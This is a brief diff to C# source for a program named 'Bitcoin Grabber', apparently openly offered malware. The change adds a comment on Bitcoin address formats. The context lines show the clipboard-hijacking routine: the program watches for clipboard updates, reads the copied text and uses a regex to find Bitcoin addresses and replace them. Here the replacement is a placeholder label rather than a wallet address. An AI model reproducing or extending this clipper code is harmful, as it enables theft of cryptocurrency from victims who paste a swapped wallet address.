@@ -81,6 +81,12 @@ namespace Bitcoin_Grabber
             {
                 if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                 {
+
+                    /* the address always starts with 1 or 3 or bc1
+                     * the length is between 26-35 characters
+                     * more info https://en.bitcoin.it/wiki/Address
+                     */
+
                     string input = Clipboard.GetText();
                     string pattern = @"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}";
                     string replacement = "<<! Bitcoin Grabber By NYAN CAT !>>";
